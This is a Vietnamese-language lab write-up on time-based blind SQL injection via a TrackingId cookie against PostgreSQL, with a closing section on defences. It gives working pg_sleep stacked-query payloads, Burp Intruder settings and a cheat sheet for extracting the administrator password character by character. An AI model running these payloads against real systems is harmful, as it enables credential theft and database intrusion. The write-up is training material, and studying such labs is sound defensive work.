# Lab 14 — Blind SQL Injection with Time Delays and Information Retrieval

## Mục tiêu
Khai thác lỗ hổng SQLi mù trong cookie `TrackingId` bằng kỹ thuật **time-based**, dùng `pg_sleep()` làm oracle true/false để dò ra password của user `administrator` từng ký tự một, sau đó đăng nhập.

---

## 1. Bản chất lỗ hổng

**Root cause:** Giống mọi lab SQLi khác — cookie `TrackingId` bị nối chuỗi trực tiếp vào câu SQL backend, không qua parameterized query.

**Điểm khác biệt cốt lõi so với Lab 11/12/18:** Ứng dụng **không lộ bất kỳ side-channel nào** đã dùng trước đây:

| Lab | Tín hiệu dùng để suy luận true/false |
|---|---|
| Lab 11 (Conditional responses) | Nội dung response khác nhau (`Welcome back` có/không) |
| Lab 12 (Conditional errors) | HTTP status khác nhau (200/500) |
| Lab 18 (Visible error-based) | Nội dung error message chứa data thật |
| **Lab 14 (Time delays)** | **Không có gì ở trên** — response luôn 200, luôn cùng nội dung, không lộ lỗi |

→ Kênh duy nhất còn lại luôn tồn tại bất kể ứng dụng xử lý response ra sao: **thời gian phản hồi**. Vì DB thực thi query đồng bộ (synchronous), server phải chờ DB trả kết quả xong mới render trang — nếu ép DB "ngủ" N giây có điều kiện, ta đo được N giây đó qua chính response time. Đây là oracle tổng quát nhất trong mọi kỹ thuật blind SQLi.

**DBMS:** PostgreSQL — xác định qua hint payload dùng `pg_sleep()` (đặc thù Postgres, giống `WAITFOR DELAY` của MSSQL hay `dbms_pipe.receive_message()` của Oracle).

---

## 2. Cơ chế payload cốt lõi

```sql
x';SELECT CASE WHEN (<điều_kiện>) THEN pg_sleep(N) ELSE pg_sleep(0) END FROM users--
```

Bóc từng phần:

- **`x`**: giá trị bất kỳ, đóng vai trò đóng nốt string literal gốc của `TrackingId`.
- **`'`**: đóng chuỗi, thoát khỏi ngữ cảnh data để bắt đầu chèn cú pháp SQL.
- **`;`**: mở **stacked query** — đóng hẳn câu SQL gốc, chạy tiếp 1 câu SELECT hoàn toàn mới ngay sau. Khác về bản chất so với Lab 12 (Oracle) — ở đó `CASE WHEN` được **lồng bên trong** 1 điều kiện `AND (...)` của cùng 1 câu query, còn đây là 2 câu lệnh SQL riêng biệt chạy tuần tự. Stacked query chỉ khả dụng khi DB driver cho phép multi-statement (không phải driver nào cũng cho, và đây cũng là vector RCE nguy hiểm nếu DB có quyền cao).
- **`CASE WHEN (<điều_kiện>) THEN pg_sleep(N) ELSE pg_sleep(0) END`**: biến điều kiện boolean thành hành động có thể đo được — true thì ngủ N giây, false thì ngủ 0 giây (gần như tức thì).
- **`FROM users`**: bắt buộc khi điều kiện tham chiếu tới cột thật trong bảng `users` (VD `username='administrator'`).
- **`--`**: comment, vô hiệu hóa phần query gốc còn sót lại phía sau.

---

## 3. Bẫy quan trọng nhất đã gặp: dấu `;` bị Cookie header nuốt mất

**Triệu chứng:** Gửi payload với `1=1` và `1=2` — **cả hai đều phản hồi nhanh như nhau**, không có delay nào cả, dù cú pháp SQL nhìn có vẻ đúng.

**Nguyên nhân thật sự — không nằm ở SQL, mà nằm ở tầng HTTP Cookie header phía trước:**

Theo spec, header `Cookie:` dùng dấu `;` để phân tách nhiều cặp `name=value` khác nhau. Nếu gửi:

```
Cookie: TrackingId=x';SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--; session=...
```

với dấu `;` **chưa encode**, parser cookie (một tầng hoàn toàn tách biệt, chạy **trước** khi giá trị chạm tới SQL) sẽ hiểu đây là nhiều cookie riêng biệt:
1. `TrackingId = x'`
2. Một chuỗi vô nghĩa `SELECT CASE WHEN...` (không có `=` nên không hợp lệ, bị bỏ qua)
3. `session = ...`

→ Giá trị `TrackingId` thực nhận được **chỉ là `x'`**, toàn bộ payload phía sau bị cắt cụt trước khi có cơ hội chạm tới database. Đây giải thích chính xác vì sao mọi điều kiện đều nhanh như nhau — **thực chất chưa có gì được thực thi**.

**Cách phát hiện:** Luôn xem tab **Raw** (không phải Pretty) để kiểm tra dấu `;` là ký tự sống hay đã encode `%3B`.

**Cách sửa:** Bôi đen toàn bộ phần payload (dạng plain text, chưa encode) rồi bấm **Ctrl+U đúng 1 lần** — dấu `;` → `%3B`, khoảng trắng → `+`. Đây cũng chính là lý do payload gốc PortSwigger đưa sẵn ở dạng đã encode (`%3B`, `+`) thay vì viết `;`, ` ` trần.

---

## 4. Bẫy thứ hai: Intruder đa luồng phá vỡ oracle thời gian

**Triệu chứng khi chạy Intruder dò độ dài password (Sniper, 1→30) với cấu hình mặc định:** Kết quả nhiễu — có tới 7 dòng cho response ~10,300-10,600ms (dùng `pg_sleep(5)` mà lại ra số gần gấp đôi), thay vì chỉ có 1 ranh giới rõ ràng giữa true/false.

**Nguyên nhân:** Burp Intruder mặc định chạy nhiều thread song song (thường 5-10). Khi nhiều request "true" (đều gọi `pg_sleep()`) chạy đồng thời, chúng tranh chấp cùng 1 connection/luồng xử lý ở DB → các lệnh sleep bị xếp hàng chồng lên nhau thay vì chạy độc lập → thời gian đo được không còn phản ánh đúng "1 request = 1 lần sleep" nữa.

**Vì sao lỗi này không xảy ra ở Lab 11/12 (oracle nội dung/status):** Với tín hiệu dạng nội dung (`Welcome back`) hay status code (200/500), mỗi response tự chứa đúng tín hiệu riêng của chính nó — chạy song song không ảnh hưởng gì tới việc đọc kết quả. Nhưng tín hiệu thời gian phụ thuộc vào **tài nguyên hệ thống dùng chung** (CPU, connection pool ở DB) — chạy song song trực tiếp làm sai lệch phép đo.

**Cách sửa:** Vào tab **Resource pool** trong Intruder → **Create new resource pool** → tick **"Maximum concurrent requests"** = **1** → gán attack vào pool này. Sau khi ép single-thread, kết quả sạch ngay lập tức dù giữ nguyên giá trị sleep.

**Đánh đổi tốc độ đã áp dụng:** Ban đầu dùng `pg_sleep(10)` để dễ phân biệt, nhưng sau khi đã single-thread (không còn tranh chấp), có thể giảm xuống `pg_sleep(5)` mà kết quả vẫn sạch — miễn khoảng cách với baseline (~1-1.3s) đủ rộng để không nhầm lẫn do network jitter. Việc này giúp giảm gần một nửa tổng thời gian chạy attack.

---

## 5. Quy trình khai thác đầy đủ (5 giai đoạn)

### Giai đoạn 0 — Xác nhận oracle hoạt động 2 chiều

Test ở Repeater trước khi đưa vào Intruder:

```
TrackingId=x'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
```
✅ Kỳ vọng: delay ~10s.

```
TrackingId=x'%3BSELECT+CASE+WHEN+(1=2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
```
✅ Kỳ vọng: phản hồi ngay (~1-2s), không delay.

→ Nếu cả 2 đúng như kỳ vọng, oracle true/false đã xác nhận hoạt động đúng cả 2 chiều.

### Giai đoạn 1 — Xác nhận user `administrator` tồn tại

```
TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
```
✅ Kỳ vọng: delay ~10s → xác nhận user tồn tại.

### Giai đoạn 2 — Dò độ dài password

Payload cơ sở (Repeater, thử tay hoặc binary search trước khi đưa vào Intruder):

```
TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>N)+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END+FROM+users--
```

Dùng Intruder Sniper (1 payload position tại `N`), Payload type Numbers 1→30, **Resource pool = 1 concurrent request**.

Đọc kết quả theo cột **Response received** (sort để dễ nhìn ranh giới):

| N | Response received | Kết luận |
|---|---|---|
| 16–19 | ~10,300–10,450ms | true |
| **20** | **308ms** | **false** |

→ `LENGTH(password) > 19` true, `> 20` false → **độ dài password = 20 ký tự.**

### Giai đoạn 3 — Dò từng ký tự bằng Intruder Cluster bomb

Payload cơ sở:

```
TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,§1§,1)='§a§')+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END+FROM+users--
```

**Cấu hình:**
- Attack type: **Cluster bomb** (2 vị trí độc lập: offset × ký tự — chạy hết mọi tổ hợp trong 1 lần, không cần lặp tay 20 lần Sniper)
- Payload position 1 (offset): Numbers, Sequential, 1→20, step 1
- Payload position 2 (ký tự): Brute forcer, character set `abcdefghijklmnopqrstuvwxyz0123456789`, min/max length 1
- **Resource pool: Maximum concurrent requests = 1** (bắt buộc, lý do đã giải thích ở mục 4)
- Tổng request: 20 × 36 = 720

**Đọc kết quả:** Sort cột **Response received** giảm dần — 20 dòng có response ~5000ms (mỗi offset đúng 1 ký tự) sẽ nổi lên đầu. Đọc cả 2 cột Payload (offset và ký tự) cho từng dòng true, sắp xếp lại theo offset tăng dần 1→20, ghép thành chuỗi 20 ký tự.

⚠️ Lưu ý: bảng kết quả không tự sắp xếp theo thứ tự số học của offset — cần đối chiếu thủ công.

### Giai đoạn 4 — Đăng nhập

Vào **My account**, đăng nhập với:
- Username: `administrator`
- Password: chuỗi 20 ký tự vừa ghép được từ Giai đoạn 3

→ Lab chuyển "Not solved" → "Solved".

---

## 6. So sánh nhanh: Time delays (Lab 14) vs 3 kỹ thuật blind/error trước

| Đặc điểm | Lab 11 (Conditional responses) | Lab 12 (Conditional errors) | Lab 18 (Error-based) | Lab 14 (Time delays) |
|---|---|---|---|---|
| Tín hiệu | Nội dung khác biệt | HTTP status khác biệt | Nội dung error chứa data thật | **Thời gian phản hồi khác biệt** |
| Tốc độ extract | 1 bit/request | 1 bit/request | Nguyên 1 giá trị/request | 1 bit/request, **nhưng mỗi request tốn thêm N giây sleep** |
| Yêu cầu hạ tầng đặc biệt | Không | Không suppress lỗi | Không suppress lỗi + DB in giá trị lỗi | **Bắt buộc single-thread khi dùng Intruder** |
| Điều kiện áp dụng | Response phân biệt theo số dòng | Query lỗi có điều kiện | Verbose error + DB leak giá trị vào message | Không có bất kỳ side-channel nào khác — kỹ thuật "cuối cùng" khi mọi kỹ thuật khác đều bất khả dụng |

---

## 7. Phòng chống

- **Gốc rễ:** Parameterized query / prepared statement — driver tách kênh code và data ở tầng giao thức, input không bao giờ được parser SQL đọc như cú pháp, bất kể chứa `'`, `;`, hay bất kỳ ký tự đặc biệt nào.
- **Vô hiệu hóa stacked query:** Nhiều driver/framework có thể cấu hình chặn hẳn multi-statement trong 1 lần gọi — giảm surface tấn công dù không thay thế được parameterization.
- **Giới hạn thời gian thực thi query (statement timeout):** Đặt timeout hợp lý ở tầng DB có thể làm gián đoạn kỹ thuật time-based (nhưng không vá được injection point — attacker vẫn có thể chuyển sang OOB hoặc kỹ thuật khác).
- **Least privilege cho DB account:** hạn chế thiệt hại nếu stacked query vẫn thực thi được (không cho phép DDL, không cho phép gọi hàm hệ thống nguy hiểm).

---

## 8. Câu hỏi tự kiểm tra

1. Vì sao dấu `;` trong payload stacked query bị cắt mất bởi chính tầng Cookie header (không phải do SQL parser) nếu chưa encode thành `%3B`? Vì sao triệu chứng của lỗi này (mọi điều kiện đều phản hồi nhanh như nhau) dễ khiến người mới nhầm là "injection point sai" thay vì "encode sai"?
2. Vì sao Intruder chạy đa luồng lại phá vỡ độ tin cậy của oracle dạng thời gian, trong khi hoàn toàn không ảnh hưởng tới oracle dạng nội dung hay status code?
3. Vì sao time-based blind SQLi được xem là kỹ thuật "cuối cùng" trong thứ tự ưu tiên khai thác — xét trên cả khía cạnh tốc độ (số request × thời gian sleep mỗi request) lẫn độ tin cậy (tín hiệu liên tục dễ nhiễu vs tín hiệu rời rạc/binary)?
4. Vì sao dùng `CASE WHEN ... THEN pg_sleep(N) ELSE pg_sleep(0) END` lại tổng quát hơn hẳn `AND 1=1`/`AND 1=0` — nó biến được loại tín hiệu nào (vốn không tồn tại tự nhiên trong response) thành tín hiệu đo được?
5. Nếu giảm giá trị sleep xuống quá thấp (VD 1 giây, gần bằng baseline), điều gì sẽ xảy ra với độ tin cậy của kết quả khi mạng có độ trễ dao động? Ngưỡng an toàn nên được chọn dựa trên yếu tố nào?

---

## 9. Cheat-sheet payload cuối cùng

```sql
-- Xác nhận oracle 2 chiều
x';SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--
x';SELECT CASE WHEN (1=2) THEN pg_sleep(10) ELSE pg_sleep(0) END--

-- Xác nhận user tồn tại
x';SELECT CASE WHEN (username='administrator') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--

-- Dò độ dài password
x';SELECT CASE WHEN (username='administrator' AND LENGTH(password)>N) THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users--

-- Dò từng ký tự (dùng trong Intruder Cluster bomb)
x';SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,§offset§,1)='§char§') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users--
```

**Cấu hình Intruder bắt buộc:** Resource pool → Maximum concurrent requests = **1** (single-thread), nếu không kết quả sẽ nhiễu do các lệnh `pg_sleep()` chạy song song tranh chấp tài nguyên DB.
